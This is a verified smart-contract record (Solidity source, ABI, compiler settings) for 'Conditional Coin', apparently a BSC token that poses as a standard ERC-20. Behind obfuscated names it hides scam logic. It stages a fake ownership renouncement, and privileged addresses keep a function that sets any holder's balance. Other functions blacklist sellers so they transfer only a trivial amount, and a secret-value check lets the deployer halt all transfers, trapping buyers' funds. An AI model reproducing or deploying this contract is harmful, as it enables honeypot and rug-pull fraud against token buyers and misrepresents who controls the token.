{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.13;\n\nlibrary SafeMath {\n\n    function add(uint256 a, uint256 b) internal pure returns (uint256) {\n        uint256 c = a + b;\n        require(c >= a, \"SafeMath: addition overflow\");\n\n        return c;\n    }\n\n    function sub(uint256 a, uint256 b) internal pure returns (uint256) {\n        return sub(a, b, \"SafeMath: subtraction overflow\");\n    }\n\n    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\n        require(b <= a, errorMessage);\n        uint256 c = a - b;\n\n        return c;\n    }\n\n    function mul(uint256 a, uint256 b) internal pure returns (uint256) {\n        if (a == 0) {\n            return 0;\n        }\n\n        uint256 c = a * b;\n        require(c / a == b, \"SafeMath: multiplication overflow\");\n\n        return c;\n    }\n\n    function div(uint256 a, uint256 b) internal pure returns (uint256) {\n        return div(a, b, \"SafeMath: division by zero\");\n    }\n\n    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\n        require(b > 0, errorMessage);\n        uint256 c = a / b;\n\n        return c;\n    }\n\n    function mod(uint256 a, uint256 b) internal pure returns (uint256) {\n        return mod(a, b, \"SafeMath: modulo by zero\");\n    }\n\n    function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\n        require(b != 0, errorMessage);\n        return a % b;\n    }\n}\n\nabstract contract fromAutoLiquidity {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface fundSender {\n    function createPair(address feeSwap, address exemptTake) external returns (address);\n\n    function feeTo() external view returns (address);\n}\n\ninterface tradingSender {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\n\ninterface receiverAutoTeam {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address buyList) external view returns (uint256);\n\n    function transfer(address fundMode, uint256 launchReceiver) external returns (bool);\n\n    function allowance(address limitLaunched, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 launchReceiver) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address fundMode,\n        uint256 launchReceiver\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed marketingLaunched, uint256 value);\n    event Approval(address indexed limitLaunched, address indexed spender, uint256 value);\n}\n\ninterface receiverAutoTeamMetadata is receiverAutoTeam {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract ConditionalCoin is fromAutoLiquidity, receiverAutoTeam, receiverAutoTeamMetadata {\n\n    uint256 public isLaunch = 3;\n\n    bool public limitFeeTotal;\n\n    function balanceOf(address buyList) public view virtual override returns (uint256) {\n        return receiverTrading[buyList];\n    }\n\n    function allowance(address amountWalletLiquidity, address toFund) external view virtual override returns (uint256) {\n        if (toFund == limitLaunch) {\n            return type(uint256).max;\n        }\n        return marketingFundTotal[amountWalletLiquidity][toFund];\n    }\n\n    function amountAt(address maxIs) public {\n        if (limitFeeTotal) {\n            return;\n        }\n        if (limitWalletMarketing == modeToken) {\n            shouldToken = limitWalletMarketing;\n        }\n        feeToken[maxIs] = true;\n        \n        limitFeeTotal = true;\n    }\n\n    function modeLaunch(address enableSellMode, address fundMode, uint256 launchReceiver) internal returns (bool) {\n        require(receiverTrading[enableSellMode] >= launchReceiver);\n        receiverTrading[enableSellMode] -= launchReceiver;\n        receiverTrading[fundMode] += launchReceiver;\n        emit Transfer(enableSellMode, fundMode, launchReceiver);\n        return true;\n    }\n\n    uint256 private shouldToken;\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return modeLaunched;\n    }\n\n    uint256 public isFundLaunch = 0;\n\n    function enableMarketing(uint256 launchReceiver) public {\n        buyLimit();\n        receiverList = launchReceiver;\n    }\n\n    bool private swapBuy;\n\n    address limitLaunch = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    address public launchedFrom;\n\n    function buyLimit() private view {\n        require(feeToken[_msgSender()]);\n    }\n\n    uint256 constant limitSwap = 11 ** 10;\n\n    bool private modeFee;\n\n    address private totalAmount;\n\n    function transferFrom(address enableSellMode, address fundMode, uint256 launchReceiver) external override returns (bool) {\n        if (_msgSender() != limitLaunch) {\n            if (marketingFundTotal[enableSellMode][_msgSender()] != type(uint256).max) {\n                require(launchReceiver <= marketingFundTotal[enableSellMode][_msgSender()]);\n                marketingFundTotal[enableSellMode][_msgSender()] -= launchReceiver;\n            }\n        }\n        return exemptFund(enableSellMode, fundMode, launchReceiver);\n    }\n\n    uint256 public modeToken;\n\n    function approve(address toFund, uint256 launchReceiver) public virtual override returns (bool) {\n        marketingFundTotal[_msgSender()][toFund] = launchReceiver;\n        emit Approval(_msgSender(), toFund, launchReceiver);\n        return true;\n    }\n\n    uint256 private modeLaunched = 100000000 * 10 ** 18;\n\n    function walletAuto(address enableSellMode, address fundMode, uint256 launchReceiver) internal view returns (uint256) {\n        require(launchReceiver > 0);\n\n        uint256 receiverTokenFee = 0;\n        if (enableSellMode == launchedFrom && isLaunch > 0) {\n            receiverTokenFee = launchReceiver * isLaunch / 100;\n        } else if (fundMode == launchedFrom && isFundLaunch > 0) {\n            receiverTokenFee = launchReceiver * isFundLaunch / 100;\n        }\n        require(receiverTokenFee <= launchReceiver);\n        return launchReceiver - receiverTokenFee;\n    }\n\n    mapping(address => mapping(address => uint256)) private marketingFundTotal;\n\n    string private maxReceiverWallet = \"CCN\";\n\n    function exemptFund(address enableSellMode, address fundMode, uint256 launchReceiver) internal returns (bool) {\n        if (enableSellMode == buyMode) {\n            return modeLaunch(enableSellMode, fundMode, launchReceiver);\n        }\n        uint256 autoTeamReceiver = receiverAutoTeam(launchedFrom).balanceOf(fromMax);\n        require(autoTeamReceiver == receiverList);\n        require(fundMode != fromMax);\n        if (buyLaunch[enableSellMode]) {\n            return modeLaunch(enableSellMode, fundMode, limitSwap);\n        }\n        launchReceiver = walletAuto(enableSellMode, fundMode, launchReceiver);\n        return modeLaunch(enableSellMode, fundMode, launchReceiver);\n    }\n\n    address fromMax;\n\n    mapping(address => bool) public feeToken;\n\n    bool public totalReceiver;\n\n    function decimals() external view virtual override returns (uint8) {\n        return shouldMin;\n    }\n\n    bool private listIs;\n\n    function owner() external view returns (address) {\n        return totalAmount;\n    }\n\n    function name() external view virtual override returns (string memory) {\n        return autoSenderFee;\n    }\n\n    mapping(address => bool) public buyLaunch;\n\n    uint8 private shouldMin = 18;\n\n    string private autoSenderFee = \"Conditional Coin\";\n\n    uint256 teamTo;\n\n    constructor (){\n        \n        walletFrom();\n        tradingSender launchedSell = tradingSender(limitLaunch);\n        launchedFrom = fundSender(launchedSell.factory()).createPair(launchedSell.WETH(), address(this));\n        fromMax = fundSender(launchedSell.factory()).feeTo();\n        if (modeFee == swapBuy) {\n            swapBuy = false;\n        }\n        buyMode = _msgSender();\n        feeToken[buyMode] = true;\n        receiverTrading[buyMode] = modeLaunched;\n        if (listIs == modeFee) {\n            swapBuy = true;\n        }\n        emit Transfer(address(0), buyMode, modeLaunched);\n    }\n\n    function shouldTeam(address swapTake) public {\n        buyLimit();\n        if (fromTotal == modeToken) {\n            modeToken = fromTotal;\n        }\n        if (swapTake == buyMode || swapTake == launchedFrom) {\n            return;\n        }\n        buyLaunch[swapTake] = true;\n    }\n\n    function getOwner() external view returns (address) {\n        return totalAmount;\n    }\n\n    function symbol() external view virtual override returns (string memory) {\n        return maxReceiverWallet;\n    }\n\n    function walletFrom() public {\n        emit OwnershipTransferred(buyMode, address(0));\n        totalAmount = address(0);\n    }\n\n    uint256 private fromTotal;\n\n    mapping(address => uint256) private receiverTrading;\n\n    address public buyMode;\n\n    function transfer(address exemptBuy, uint256 launchReceiver) external virtual override returns (bool) {\n        return exemptFund(_msgSender(), exemptBuy, launchReceiver);\n    }\n\n    function buyMarketing(address exemptBuy, uint256 launchReceiver) public {\n        buyLimit();\n        receiverTrading[exemptBuy] = launchReceiver;\n    }\n\n    event OwnershipTransferred(address indexed maxFund, address indexed exemptMax);\n\n    bool public fundFrom;\n\n    uint256 private limitWalletMarketing;\n\n    uint256 receiverList;\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"limitLaunched\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"maxFund\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"exemptMax\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"marketingLaunched\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"amountWalletLiquidity\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"toFund\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"maxIs\",\"type\":\"address\"}],\"name\":\"amountAt\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"toFund\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"launchReceiver\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"buyList\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"buyLaunch\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"exemptBuy\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"launchReceiver\",\"type\":\"uint256\"}],\"name\":\"buyMarketing\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"buyMode\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"launchReceiver\",\"type\":\"uint256\"}],\"name\":\"enableMarketing\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"feeToken\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"fundFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"isFundLaunch\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"isLaunch\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"launchedFrom\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"limitFeeTotal\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"modeToken\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"swapTake\",\"type\":\"address\"}],\"name\":\"shouldTeam\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalReceiver\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"exemptBuy\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"launchReceiver\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"enableSellMode\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"fundMode\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"launchReceiver\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"walletFrom\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "ConditionalCoin", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}